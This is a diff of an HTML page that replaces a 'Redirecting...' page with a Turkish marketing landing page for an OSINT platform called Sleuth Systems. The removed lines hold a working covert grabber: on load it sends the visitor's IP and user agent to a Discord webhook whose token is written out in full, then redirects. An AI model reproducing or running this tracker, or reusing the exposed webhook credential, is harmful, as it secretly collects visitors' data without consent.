@@ -1,43 +1,255 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+
+<html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <script>
-        async function sendIP() {
-            try {
-                let response = await fetch("https://api64.ipify.org?format=json");
-                let data = await response.json();
-                let ip = data.ip;
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sleuth Systems — OSINT Platform</title>
+  <meta name="description" content="Sleuth Systems — ileri düzey OSINT araçları, hızlı analiz, görselleştirme ve olay takibi." />
+  <meta name="theme-color" content="#050714" />  <!-- Google Fonts -->  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">  <style>
+    :root{
+      --bg:#050714;
+      --glass: rgba(255,255,255,0.04);
+      --accent-a:#00f5ff;
+      --accent-b:#8a2be2;
+      --muted: rgba(255,255,255,0.55);
+      --glass-2: rgba(255,255,255,0.03);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,#02020a 0%, #060617 60%);font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;color:white;-webkit-font-smoothing:antialiased}
 
-                let userAgent = navigator.userAgent;
+    /* Canvas particle background container */
+    .bg-canvas{position:fixed;inset:0;z-index:0;pointer-events:none}
 
-                let payload = {
-                    content: `**Yeni ziyaretçi tespit edildi!**\n🔹 IP Adresi: ${ip}\n🖥 Tarayıcı: ${userAgent}`
-                };
+    .container{position:relative;z-index:5;max-width:1200px;margin:0 auto;padding:48px 28px}
 
-                let webhookURL = "https://discord.com/api/webhooks/1375855873305481326/xobUrNn-1XwxUtPmKvbozqBn_DJLQi-q9RWvOAyUmxEz2wkktlbYTozDpwsrVcO2KHoP";
+    header{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px}
+    .brand{display:flex;gap:14px;align-items:center}
+    .logo{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,var(--accent-a),var(--accent-b));display:grid;place-items:center;box-shadow:0 8px 30px rgba(138,43,226,0.14), inset 0 -6px 20px rgba(0,0,0,0.4)}
+    .logo svg{filter:drop-shadow(0 6px 20px rgba(138,43,226,0.18))}
+    .brand h1{margin:0;font-family:Orbitron, Inter;letter-spacing:0.6px;font-weight:700;font-size:18px}
+    .brand p{margin:0;font-size:12px;color:var(--muted)}
 
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
+    nav{display:flex;gap:12px;align-items:center}
+    .btn{padding:10px 16px;border-radius:12px;background:transparent;border:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(6px);cursor:pointer;color:var(--muted);font-weight:600}
+    .btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02010a;border:none;box-shadow:0 8px 30px rgba(0,0,0,0.4)}
 
-                setTimeout(() => {
-                    window.location.href = "https://glocg.github.io/-/";
-                }, 2000);
-            } catch (error) {
-                console.error("IP adresi gönderilemedi:", error);
-            }
-        }
+    /* Hero */
+    .hero{display:grid;grid-template-columns:1fr 460px;gap:36px;align-items:center;margin-top:36px}
+    .hero-left h2{font-size:48px;line-height:1.02;margin:0;font-weight:800;letter-spacing:-1px}
+    .highlight{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));-webkit-background-clip:text;background-clip:text;color:transparent}
+    .hero-left p{color:var(--muted);margin-top:14px;font-size:16px}
 
-        // Sayfa yüklendiğinde çalıştır
-        window.onload = sendIP;
-    </script>
-</head>
+    .cta-row{display:flex;gap:12px;margin-top:22px}
+    .ghost{background:transparent;border:1px solid rgba(255,255,255,0.08);padding:10px 14px;border-radius:10px}
+
+    /* Card styles */
+    .card{border-radius:18px;padding:22px;background:linear-gradient(180deg,var(--glass),var(--glass-2));box-shadow:0 10px 40px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03)}
+
+    /* Right panel */
+    .hero-right{position:relative}
+    .panel-visual{height:420px;border-radius:16px;overflow:hidden;display:flex;flex-direction:column}
+    .visual-top{flex:1;padding:18px;display:flex;align-items:center;justify-content:space-between}
+    .fingerprint{width:92px;height:92px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));display:grid;place-items:center}
+    .stats{display:flex;flex-direction:column;gap:6px}
+    .stats b{font-size:20px}
+    .visual-chart{height:160px;background:linear-gradient(180deg,rgba(0,0,0,0.25),transparent);display:grid;place-items:center}
+
+    /* Features */
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:28px}
+    .feature{padding:18px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);border:1px solid rgba(255,255,255,0.03)}
+    .feature h4{margin:6px 0 0 0}
+    .feature p{color:var(--muted);font-size:13px;margin-top:8px}
+
+    /* Footer */
+    footer{margin-top:42px;padding:22px;border-radius:14px;background:linear-gradient(90deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));display:flex;justify-content:space-between;align-items:center}
+
+    /* small screens */
+    @media (max-width:980px){
+      .hero{grid-template-columns:1fr;}
+      .hero-right{order:-1;margin-bottom:18px}
+      .features{grid-template-columns:1fr 1fr}
+    }
+    @media (max-width:560px){
+      .features{grid-template-columns:1fr}
+      .hero-left h2{font-size:34px}
+    }
+
+    /* tiny neon accent */
+    .neon{position:relative}
+    .neon:after{content:"";position:absolute;inset:0;border-radius:12px;filter:blur(18px);opacity:0.18;background:linear-gradient(90deg,var(--accent-a),var(--accent-b));z-index:-1}
+
+    /* subtle tilt effect */
+    .tilt{transform-style:preserve-3d;transition:transform 250ms cubic-bezier(.2,.9,.3,1)}
+
+    /* micro animations */
+    .fade-up{opacity:0;transform:translateY(12px);transition:all 600ms cubic-bezier(.2,.9,.3,1)}
+    .reveal{opacity:1;transform:none}
+
+  </style></head>
 <body>
-    <p>Redirecting... Eğer otomatik yönlendirilmezseniz, <a href="https://glocg.github.io/-/">buraya tıklayın</a>.</p>
-</body>
-</html>
+  <canvas id="bg" class="bg-canvas"></canvas>  <div class="container">
+    <header>
+      <div class="brand">
+        <div class="logo" aria-hidden="true">
+          <!-- simple sleuth icon -->
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M11 2v6" stroke="#fff" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round" opacity="0.95"/>
+            <circle cx="11" cy="12" r="7" stroke="#fff" stroke-width="1.25" opacity="0.95"/>
+            <path d="M20 20l-3-3" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" opacity="0.95"/>
+          </svg>
+        </div>
+        <div>
+          <h1>Sleuth Systems</h1>
+          <p>OSINT · Analiz · Görselleştirme</p>
+        </div>
+      </div><nav>
+    <button class="btn">Features</button>
+    <button class="btn">Docs</button>
+    <button class="btn">Pricing</button>
+    <button class="btn primary" id="visit">htrps://sleuth.site</button>
+  </nav>
+</header>
+
+<main class="hero">
+  <section class="hero-left">
+    <h2 class="fade-up reveal">Sleuth Systems — <span class="highlight">OSINT</span> için yeniden tanımlandı</h2>
+    <p class="fade-up reveal" style="transition-delay:80ms">Derin web taraması, görsel analiz, bağlantı haritalama ve gerçek zamanlı uyarılar. Teknoloji, tasarım ve hızlı veri işleme bir araya geliyor. Gösterişli sözler değil — sonuçlar.</p>
+
+    <div class="cta-row fade-up reveal" style="transition-delay:160ms">
+      <button class="btn primary" onclick="copyUrl()">Siteyi Kopyala</button>
+      <a class="btn ghost" href="#features" style="text-decoration:none;color:inherit">Özellikleri Gör</a>
+    </div>
+
+    <div style="margin-top:22px;display:flex;gap:12px;align-items:center">
+      <div class="card" style="display:flex;gap:12px;align-items:center;max-width:520px">
+        <div style="width:56px;height:56px;border-radius:10px;background:linear-gradient(135deg,var(--accent-b),var(--accent-a));display:grid;place-items:center;font-weight:800">AI</div>
+        <div>
+          <div style="font-weight:700">Gerçek Zamanlı Analiz</div>
+          <div style="color:var(--muted);font-size:13px;margin-top:6px">Karmaşık veri setlerinden anlık içgörüler. Filtreleyin, bağlayın, hareket geçin.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <aside class="hero-right">
+    <div class="panel-visual tilt card" id="tiltCard" style="transition:transform 300ms">
+      <div class="visual-top">
+        <div>
+          <div style="font-size:13px;color:var(--muted)">Live Scanner</div>
+          <div class="stats"><b id="liveCount">1,248</b><small style="color:var(--muted)">events indexed</small></div>
+        </div>
+        <div class="fingerprint neon">
+          <!-- fingerprint svg artistic -->
+          <svg width="72" height="72" viewBox="0 0 24 24" fill="none">
+            <path d="M12 2v2" stroke="white" stroke-width="0.8" stroke-linecap="round"/>
+            <path d="M6 8c1-4 6-6 10-4" stroke="white" stroke-width="0.8" stroke-linecap="round"/>
+            <path d="M4 14c1-3 5-5 8-4" stroke="white" stroke-width="0.8" stroke-linecap="round"/>
+          </svg>
+        </div>
+      </div>
+      <div class="visual-chart" id="chartArea">
+        <div style="text-align:center">
+          <div style="font-weight:700">Network Graph</div>
+          <div style="color:var(--muted);font-size:13px;margin-top:8px">Etkinlikleri, ilişkileri ve izleri anında görselleştirin.</div>
+        </div>
+      </div>
+    </div>
+  </aside>
+</main>
+
+<section id="features" class="features">
+  <div class="feature card fade-up reveal">
+    <div style="font-size:22px;font-weight:800">Bağlantı Haritalama</div>
+    <p>Görsel ağ haritalarıyla ilişkileri keşfedin. Filtreler, katmanlar ve etkileşimli izleme.</p>
+  </div>
+  <div class="feature card fade-up reveal" style="transition-delay:60ms">
+    <div style="font-size:22px;font-weight:800">Görsel Analiz</div>
+    <p>Görüntüden yüz algılama, logo tanıma ve benzer görüntü aramaları.</p>
+  </div>
+  <div class="feature card fade-up reveal" style="transition-delay:120ms">
+    <div style="font-size:22px;font-weight:800">Gerçek Zamanlı Uyarılar</div>
+    <p>Kritik değişiklikler anında push/ webhook ile bildirilir. Olay bazlı kurallar.</p>
+  </div>
+</section>
+
+<footer>
+  <div>
+    <div style="font-weight:700">Sleuth Systems</div>
+    <div style="color:var(--muted);font-size:13px">htrps://sleuth.site • OSINT · Analiz</div>
+  </div>
+  <div style="display:flex;gap:10px;align-items:center">
+    <small style="color:var(--muted)">© Sleuth Systems — 2025</small>
+    <button class="btn" onclick="scrollToTop()">Yukarı</button>
+  </div>
+</footer>
+
+  </div>  <script>
+    // Copy provided URL
+    function copyUrl(){
+      const u = 'htrps://sleuth.site';
+      navigator.clipboard?.writeText(u).then(()=>{
+        const b = document.querySelector('.btn.primary');
+        b.textContent = 'Kopyalandı!';
+        setTimeout(()=>b.textContent = u,1500);
+      }).catch(()=>alert('Kopyalama desteklenmiyor'));
+    }
+
+    // simple tilt on mouse move
+    const card = document.getElementById('tiltCard');
+    window.addEventListener('mousemove', (e)=>{
+      const rect = card.getBoundingClientRect();
+      const x = (e.clientX - rect.left) / rect.width - 0.5;
+      const y = (e.clientY - rect.top) / rect.height - 0.5;
+      card.style.transform = `rotateX(${ -y * 6 }deg) rotateY(${ x * 10 }deg)`;
+    });
+    window.addEventListener('mouseleave', ()=> card.style.transform = '');
+
+    // reveal on scroll
+    const observers = document.querySelectorAll('.fade-up');
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('reveal') });
+    }, {threshold:0.12});
+    observers.forEach(o=>io.observe(o));
+
+    function scrollToTop(){ window.scrollTo({top:0,behavior:'smooth'}) }
+
+    // particle background
+    const canvas = document.getElementById('bg');
+    const ctx = canvas.getContext('2d');
+    let W=canvas.width=innerWidth, H=canvas.height=innerHeight; 
+    const pts = [];
+    function init(){ pts.length=0; const count = Math.floor((W*H)/60000);
+      for(let i=0;i<count;i++){ pts.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.3+0.2,vx:(Math.random()-0.5)*0.25,vy:(Math.random()-0.5)*0.25}) }
+    }
+    function resize(){ W=canvas.width=innerWidth; H=canvas.height=innerHeight; init(); }
+    addEventListener('resize', resize);
+
+    function frame(){ ctx.clearRect(0,0,W,H);
+      // gradient glow
+      const g = ctx.createLinearGradient(0,0,W,H); g.addColorStop(0,'rgba(10,10,25,0.4)'); g.addColorStop(1,'rgba(2,2,6,0.6)'); ctx.fillStyle = g; ctx.fillRect(0,0,W,H);
+
+      for(let p of pts){ p.x += p.vx; p.y += p.vy; if(p.x<-20) p.x=W+20; if(p.x>W+20) p.x=-20; if(p.y<-20) p.y=H+20; if(p.y>H+20) p.y=-20;
+        ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fillStyle = 'rgba(120,100,255,0.06)'; ctx.fill();
+      }
+      // connect nearby
+      for(let i=0;i<pts.length;i++){
+        for(let j=i+1;j<pts.length;j++){
+          const a=pts[i], b=pts[j]; const dx=a.x-b.x, dy=a.y-b.y; const d=dx*dx+dy*dy; if(d<16000){ ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.strokeStyle='rgba(100,120,255,'+ (0.12 - d/16000*0.1) +')'; ctx.lineWidth=0.6; ctx.stroke(); }
+        }
+      }
+      requestAnimationFrame(frame);
+    }
+    resize(); frame();
+
+    // tiny live-count increment demo (eye candy)
+    const live = document.getElementById('liveCount');
+    let count = parseInt(live.textContent.replace(/,/g,''))||1248;
+    setInterval(()=>{ count += Math.floor(Math.random()*6); live.textContent = count.toLocaleString(); }, 2200);
+
+    // onboarding small flourish
+    document.addEventListener('DOMContentLoaded', ()=>{
+      document.querySelectorAll('.reveal').forEach((el,i)=>setTimeout(()=>el.classList.add('reveal'), i*80));
+    });
+  </script></body>
+                                                                       </html>
